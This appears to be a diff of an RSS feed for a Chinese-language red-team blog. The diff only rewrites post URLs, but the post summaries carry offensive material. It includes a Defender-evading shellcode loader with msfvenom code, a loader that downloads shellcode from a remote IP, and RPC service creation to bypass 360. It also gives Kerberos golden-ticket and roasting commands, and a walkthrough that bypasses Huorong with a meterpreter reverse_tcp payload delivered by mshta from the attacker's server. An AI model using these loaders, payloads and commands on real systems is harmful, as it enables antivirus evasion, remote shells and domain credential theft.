+      <link>https://2867a0.github.io//2867a0/posts/2023/bigstack/</link>
       <pubDate>Mon, 13 Feb 2023 08:00:00 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2023/bigstack/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2023/bigstack/</guid>
       <description>[TOC]&#xA;2022年底国外技术人员发现的技巧，在内存中分配一个大的堆栈，defender就检测不了了。&#xA;测试用的是x64 metasploit 生成的 calc，原文中是硬编码栈内容，生成非常大。下面的代码时创建一个动态数组，将shellcode放到数组末尾，武器化可以远程拉取shellcode。&#xA;visual studio编译需要设置字符集为多字节、堆栈提交大小为200000，堆栈大小可以自己定义&#xA;修改后的完整代码：&#xA;#include &amp;lt;windows.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;time.h&amp;gt; #include &amp;lt;random&amp;gt; typedef LPVOID (WINAPI* VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect); typedef BOOL (WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD); typedef HANDLE (WINAPI* CreateThread_t)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); unsigned char sVirtualProtect[] = { &amp;#39;V&amp;#39;,&amp;#39;i&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39;u&amp;#39;,&amp;#39;a&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;P&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;o&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;c&amp;#39;,&amp;#39;t&amp;#39;, 0x0 }; unsigned char sVirtualAlloc[] = { &amp;#39;V&amp;#39;,&amp;#39;i&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39;u&amp;#39;,&amp;#39;a&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;A&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;o&amp;#39;,&amp;#39;c&amp;#39;,0x0 }; unsigned char sCreateThread[] = { &amp;#39;C&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;a&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;T&amp;#39;,&amp;#39;h&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;a&amp;#39;,&amp;#39;d&amp;#39;,0x0, }; #define STACKSIZE 2000000 int main (VOID) { //msfvenom calc payload // msfvenom --platform windows --arch x64 -p windows/x64/exec CMD=calc.</description>
     </item>
     <item>
       <title>Rpc Create Service</title>
-      <link>https://github.com/2867a0/posts/2022/rpc-create-service/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2022/rpc-create-service/</link>
       <pubDate>Wed, 23 Nov 2022 22:53:46 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2022/rpc-create-service/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2022/rpc-create-service/</guid>
       <description>调用CreateService()创建服务会被360拦截。用Rpc接口创建服务就能绕过。&#xA;SCMR pipe protocol uuid IDL file \\pipe\svcctl MS-SCMR {367ABB81-9844-35F1-AD32-98F038001003} 微软官方文档 SCMR（Service Control Manager Remote Protocol）是基于RPC的协议，用于配置和控制远程计算机上运行的服务程序。该协议维护一个内部数据库来存储服务程序配置和状态。服务控制管理器协议对该内部数据库具有独占访问权。&#xA;在一个操作系统实例上只有一个 SCM 和一个对应的 SCM 数据库。对此内部数据库的任何更新都只能通过服务控制管理器远程协议进行。SCM 负责序列化对 SCM 数据库的所有并发访问。SCM数据库常驻内存；每次 SCM 重新启动时（每次重新启动后）都会重新创建它。SCM 数据库的一部分是从持久存储（有关注册服务的所有信息）和部分非持久存储（服务的当前活动状态）中检索的。&#xA;当添加、配置服务时，持久性信息由 SCM 修改，或删除。任何直接在持久化存储中直接修改数据库持久化部分的尝试都是不支持的场景，并且会导致可能的不一致。最后，如果 SCM 被强制终止，操作系统将关闭并重新启动。&#xA;通俗地说服务是存放在系统维护的SCM数据库里面的，我们调用创建、删除服务的函数都是对数据库的操作。SCMR对应的Rpc接口为\\pipe\svcctl，根据微软描述，SCMR没有标准分配，只有 Microsoft 使用其他协议中指定的分配程序进行的私有分配。也就是说，RpcView里面是看不见这个Rpc接口的&#xA;微软在其官方文档中提供了该协议的操作示例&#xA;Demo代码 基于上述假设编写测试代码。将微软提供的IDL代码保存为scmr.idl，同时微软还提到该IDL还依赖ms-dtyp.idl，都将其保存下来并编译。因为是Rpc客户端，我们只需要scmr.idl编译生成的scmr_c.c、scmr_h.h，和ms-dtyp.idl编译生成的ms-dtyp_h.h相关代码。最后的文件如下图&#xA;导入完成之后需要修复一些编译上的错误，“类型重定义错误”将相关代码代码注释就能解决。&#xA;“无法解析外部符号”需要添加rpcrt4.lib，添加代码如下&#xA;#pragma comment(lib, &amp;#34;rpcrt4.lib&amp;#34;) void __RPC_FAR* __RPC_USER MIDL_user_allocate (size_t size) { return HeapAlloc (GetProcessHeap (), 0, size); } void __RPC_USER MIDL_user_free (void* p) { HeapFree (GetProcessHeap (), 0, p); } 之后main函数中导入scmr_h.h就可以调用ROpenSCManagerW()和RCreateService()函数创建服务</description>
     </item>
     <item>
       <title>回调函数加载器</title>
-      <link>https://github.com/2867a0/posts/2022/callback-function/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2022/callback-function/</link>
       <pubDate>Sun, 13 Nov 2022 22:53:46 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2022/callback-function/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2022/callback-function/</guid>
       <description>是github项目AlternativeShellcodeExec中提到的一些函数可以用来执行shellcode&#xA;项目里面还有很多函数可以利用，因为是在本地线程执行shellcode的，所以这里只贴出其中一个完整的利用代码&#xA;#include &amp;lt;windows.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;wincrypt.h&amp;gt; #include &amp;lt;WinInet.h&amp;gt; #pragma comment(lib, &amp;#34;WinInet.lib&amp;#34;) // Requires Crypt32.lib // 需要在链接器 -&amp;gt; 输入 -&amp;gt; 附加依赖项 中添加如下库 /* kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib Crypt32.lib */ // 定义结构体 typedef struct { char* shellcode; int size; } SHELLCODO, * PSHELLCODE; BOOL downloadShellcode(LPCWSTR url, int port, LPCWSTR payloadPath, BOOL isEncrypted, PSHELLCODE pShellcode); int main() { SHELLCODO shellcode = { 0 }; BOOL s = downloadShellcode(L&amp;#34;192.</description>
     </item>
     <item>
       <title>Rpc introduction</title>
-      <link>https://github.com/2867a0/posts/2022/rpc-intro/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2022/rpc-intro/</link>
       <pubDate>Sat, 10 Sep 2022 22:53:46 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2022/rpc-intro/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2022/rpc-intro/</guid>
       <description>2. rpc介绍(是什么、有什么用、谁在用) 2.1 RPC介绍 RPC协议主要用来进行远程过程调用，用一句话来概括，就是允许用户程序调用服务器上的函数进行计算，由此实现两者交互。&#xA;早先的企业环境中，所有的服务都在一台主机上，就会导致服务器负荷过重，无法保证业务的正常运作。正因如此，后来企业就更换了一种思路，将不同服务分开，分别存放在不同主机上，暂时解决了负荷问题。但是久而久之，这样的方式也开始显现弊端，比如当用户需要使用不同服务器上的服务协作来完成任务时，服务与服务之间该如何交互？&#xA;这就是RPC要解决的问题，简言之，RPC可以允许一台机器上的程序调用另一台机器上的函数，通过各计算机协作进行计算，以保证用户任务顺利完成，RPC的通信过程如下图所示（摘自微软官方）&#xA;客户端和服务器在各自的本地维护一个stub（理解为函数工厂），stub里面会暴露出客户端可以调用（服务器可以解析）的函数，客户端stub在收到这些函数之后会将其序列化并通过网络传递给服务器；服务器stub在收到函数调用之后会将序列化的内容解序列化，并调用本地对应的函数，获得结果之后序列化结果并传递给客户端。客户端会按照相同的方式反序列化结果。&#xA;2.3 有什么用 分布式 如上所说，我们可以利用RPC的这个通信方式将服务分散到不同的服务器上部署，在应用层面调用远程服务就像在本地调用一样简单。在很多大型架构上可以看到它的身影如Dubbo，当然这不是本次讨论的重点。 本地跨进程通信 RPC也可以在本地进行调用，将RPC客户端和服务端放在同一服务器，实现不同进程之间的通信。 2.4 谁在用 在Windows上面，很多功能都利用到了RPC通信，身份验证、服务创建、目录复制等。最典型的就是lsass.exe进程，我们用RpcView可以看到很多程序都有提供Rpc接口，下面是lsass.exe的rpc接口&#xA;服务创建 (MS-SCMR) 目录复制服务 (MS-DRSR) 远程注册表 (MS-RRP) 计划任务 (MS-SCMR) 打印系统 (MS-RPRN) Windows 管理规范 (MS-WMI) Netlogon 远程协议 (MS-NRPC) 其他的，很多大型架构上可以看到它的身影如Dubbo，当然这不是本次讨论的重点。&#xA;3. 攻击面 针对Windows上的Rpc攻击面，目前在互联网上看到大多数都是在寻找Rpc接口中可以滥用的函数，典型案例就是Printer Bug和PetitPotam。&#xA;Printer Bug 利用的是\pipe\spoolss接口中的 RpcRemoteFindFirstPrinterChangeNotificationEx() 函数，该函数会创建一个远程更改通知对象，该对象监视打印机对象的更改，如果指向的打印机路径为远程打印机，则RPC服务器会像远程打印机发起认证。&#xA;PetitPotam 利用的是\pipe\efsrpc接口中的 EfsRpcOpenFileRaw() 函数，该函数用于打开服务器上的加密对象以进行备份或还原，当指定的加密对象为UNC路径时，RPC服务器就会去查找该UNC路径，同时会发起认证请求。&#xA;漏洞 Protocol function Printer Bug MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx() PetitPotam MS-EFSR EfsRpcOpenFileRaw() 4. rpc挖掘方法 寻找可滥用的Rpc接口&#xA;RpcView手动分析每一个接口 Ghidra + Jupyter 图形化分析（该方法时用脚本导出所有具有Rpc功能的DLL，再用Ghidra将DLL进一步处理，输出出每个DLL具有的Rpc函数，最后将结果导入到Jupyter进行分析） 5. Printer BUG Printer BUG 这个洞利用的是spoolsv.</description>
     </item>
     <item>
       <title>Kerberos: 利用</title>
-      <link>https://github.com/2867a0/posts/2022/kerberos-attack/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2022/kerberos-attack/</link>
       <pubDate>Sat, 05 Mar 2022 22:53:46 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2022/kerberos-attack/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2022/kerberos-attack/</guid>
       <description>TGT阶段 黄金票据 利用的是第二次：身份认证请求包，身份认证返回包中的ticket使用krbtgt的 NTLM hash加密，如果能获得krbtgt hash，就能自己制作TGT票据。即黄金票据&#xA;kerberos::golden /domain:[domain] /sid:[domain sid] /id:500 /user:AnyFuckUser /krbtgt:[krbtgt NTLM Hash] 用户名枚举 在请求TGT票据协商请求包中，因为服务器没有去验证请求用户的密码，所以可以修改CNameString去猜解域用户名&#xA;nmap的krb5-enum-users脚本使用该方式来枚举用户名。&#xA;python 脚本&#xA;密码爆破/密码喷洒 当请求TGT时用户对应的密码不正确，服务器会返回KDC_ERR_PREAUTH_FAILED错误。可以用这个值去暴力破解用户对应的密码。&#xA;（错误密码的数据返回包）&#xA;（正确密码返回的数据包）&#xA;python脚本实现，爆破和喷洒用的都是同一个函数，判断一下返回值就可以了&#xA;AS-Repoasting 域内用户可以配置 &amp;ldquo;不要求预身份认证&amp;rdquo;。&#xA;当这些用户向服务器发起协商请求包时，对于通过协商请求的响应包，可以获得响应包中的cipher字段（这部分是使用用户hash加密session-key），将其拼接成 Kerberos 5 AS-REP etype 23 使用hashcat破解出该用户的明文口令。&#xA;拼接方式为：$krb5asrep$23$[user]@[domain]:[cipher前32位]$[cipher后续值]&#xA;用hashcat破解&#xA;hashcat -m 18200 hash.txt /usr/share/wordlist/rockyou.txt impacket里面对于设置该值的用户使用getTGT脚本是获取不到TGT票据的，会报SessionKeyDecryptionError错误。响应数据包中会直接返回TGT票据&#xA;用GetNPUsers脚本就可以解析了&#xA;impacket-GetNPUsers yunwei.lab/user:123.com -dc-ip 20.0.0.100 python脚本实现，输入用户名/用户名字典，输出hashcat可直接跑的命令&#xA;Path The Hash / Path The Key 在使用账号密码登录时会把密码加密成hash，所以直接使用hash去认证也可以。如果hash为NTLM + RC4加密，则为Pass The Hash。Hash为AES Key则为Pass The Key&#xA;TGS阶段 Kerberoasting 在请求TGS票据的时候，只要请求的TGT票据是正确的，服务器就会返回请求服务对应的TGS票据，并不会去检查访问权限。&#xA;返回的TGS票据中ticket.enc_part是用要请求的服务NTLM Hash加密的，爆破这个值就能获得请求服务的NTLM Hash</description>
     </item>
     <item>
       <title>Kerberos: AP-REQ</title>
-      <link>https://github.com/2867a0/posts/2022/kerberos-ap-req/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2022/kerberos-ap-req/</link>
       <pubDate>Sun, 20 Feb 2022 22:53:46 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2022/kerberos-ap-req/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2022/kerberos-ap-req/</guid>
       <description>请求TGS票据我准备用kekeo。在普通域机器上执行下面的命令发起TGS请求。&#xA;# 先请求一张jm的TGT票据 kekeo.exe &amp;#34;tgt::ask /domain:yunwei.lab /user:jm /password:123.com&amp;#34; # 再请求TGS票据 kekeo.exe &amp;#34;tgs::ask /tgt:TGT_.kirbi /service:cifs/srv2012.yunwei.lab&amp;#34; &amp;#34;exit&amp;#34; 请求 常规的请求TGS票据里面会携带padata和req-body数据块。&#xA;padata中的ap-req.ticket是请求的TGT票据。KDC会校验TGT票据，如果票据正确，就返回TGS票据。&#xA;req-body块中，cname.CNameString表示发起请求的用户是jm；sname.SNameString表示要访问的spn为cift/srv2012.yunwei.lab，&#xA;响应 KDC 使用krbtgt hash解密TGT，不管用户有没有访问对应服务的权限，就会返回用请求的服务hash加密的TGS票据（ticket），票据对应的服务为cifs/srv2012.yunwei.lab。如下图，ticket.enc-part.cipher使用该服务的NTLM hash加密。&#xA;同时，返回的数据包表明这张票据是jm这个用户请求的（cname.CNameString）。&#xA;和ticket同级还有一个enc-part，这个是用第一阶段里面返回的session_key加密的。这个enc-part会作为下一阶段的认证密钥</description>
     </item>
     <item>
       <title>Kerberos: AS-REQ</title>
-      <link>https://github.com/2867a0/posts/2022/kerberos-as-req/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2022/kerberos-as-req/</link>
       <pubDate>Thu, 10 Feb 2022 22:53:46 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2022/kerberos-as-req/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2022/kerberos-as-req/</guid>
       <description> 分析kerberos请求第一阶段，以下是基于impacket请求发出的数据包进行分析。其他工具可能有所差异，但问题不大。&#xA;impacket-getTGT yunwei.lab/jm:123.com -dc-ip 20.0.0.100 在impacket中，一共会发送两次AS Req包。&#xA;第一次：协商 第一次为协商请求包，这个数据包的功能有两个：&#xA;服务器和客户端协商加密协议（etype.ENCTYPE），如果不支持则继续协商。 其次判断用户名是否存在（cname.cname-string.CNameString）。 上述条件都满足后，会进入下一阶段：身份验证&#xA;协商包里面只有用户名。服务器会去判断请求的用户名是否存在，如果不存在则不再进行后续操作。&#xA;其他字段的信息：realm指的是域控的域名。nonce是随机生成的数&#xA;第二次：身份认证 这个请求中不会直接发送密码hash给服务器，而是发送一个用密码加密的时间戳（padata-type: pA-ENC-TIMESTAMP）给服务器。服务器收到请求后会使用用户名对应的密码解密时间戳。&#xA;如果时间戳在一定范围内，则认证成功，服务器返回TGT票据（ticket）和Session Key（etc-part.cipher）。&#xA;TGT票据使用krbtgt账户的密码hash进行加密，TGT票据中包含PAC。PAC又包含 Client SID + Client Group。 Session Key使用（CNameString）用户名对应的密码进行加密，作为下阶段认证密钥。但是，服务器不会存储Session Key。 </description>
     </item>
     <item>
       <title>Kerberos: 认证过程</title>
-      <link>https://github.com/2867a0/posts/2022/kerberos-base/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2022/kerberos-base/</link>
       <pubDate>Tue, 01 Feb 2022 22:53:46 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2022/kerberos-base/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2022/kerberos-base/</guid>
       <description>基本认证过程 请求TGT票据 客户端请求：发送客户端hash加密的时间戳&#xA;服务器响应：解密，如果时间戳在一定范围内，认证通过，返回TGT票据和session key。TGT票据使用krbtgt hash加密，TGT票据中包含PAC。PAC又包含 Client SID + Client Group。session key会作为下阶段认证密钥&#xA;请求TGS票据 客户端请求：拿着TGT票据向KDC发起针对特定服务的TGS请求&#xA;服务器响应：使用krbtgt hash解密TGT，返回用服务器hash加密的TGS票据和（用上一阶段的session key加密的）新的session key。（这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据）&#xA;AP请求/响应 客户端请求：拿着TGS票据请求特定服务&#xA;服务器响应：使用自身hash解密出TGS票据中的PAC，向KDC询问客户端是否有访问权限。KDC解密PAC，获取Client SID和group，再根据该服务的ACL，判断Client是否有访问权限&#xA;参考 Windows Protocol Kerberos篇&#xA;黄金票据和白银票据攻击及其原理介绍 - 简书</description>
     </item>
     <item>
       <title>绕过火绒上线MSF</title>
-      <link>https://github.com/2867a0/posts/2021/hipsdaemon-bypass/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2021/hipsdaemon-bypass/</link>
       <pubDate>Sat, 13 Nov 2021 22:53:46 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2021/hipsdaemon-bypass/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2021/hipsdaemon-bypass/</guid>
       <description>[TOC]&#xA;环境 攻击机 靶机 kali + msf + hta脚本 Windows Server 2008 + mshta IP: 10.0.0.4 IP: 10.0.0.100 复现 kali 下载原始hta脚本（1.hta），msf生成原始32位windows shellcode，并将shellcode进行base64编码。将编码后的shellcode替换原始hta脚本（2.hta）&#xA;msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=10.0.0.4 lport=443 -f raw &amp;gt; shellcode.bin cat shellcode.bin | base64 -w 0 kali开启http服务准备投递hta脚本&#xA;sudo python3 -m http.server 8888 开启msf准备接收反弹shell&#xA;sudo msfconsole use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.0.0.4 set lport 443 #开启443需要root权限 run Windows Server 2008 开启cmd执行mshta http://10.0.0.4:8888/2.hta，火绒不拦截也未检测出2.hta为恶意payload，kali获得shell&#xA;其他 hta脚本静态查杀情况 原始脚本1.</description>
     </item>
     <item>
       <title>Hello</title>
-      <link>https://github.com/2867a0/posts/2021/first-post/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2021/first-post/</link>
       <pubDate>Fri, 01 Jan 2021 22:53:46 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2021/first-post/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2021/first-post/</guid>
       <description>[TOC]&#xA;hello&#xA;anything&#xA;one a b aa bb two aaa&#xA;image </description>
     </item>
   </channel>
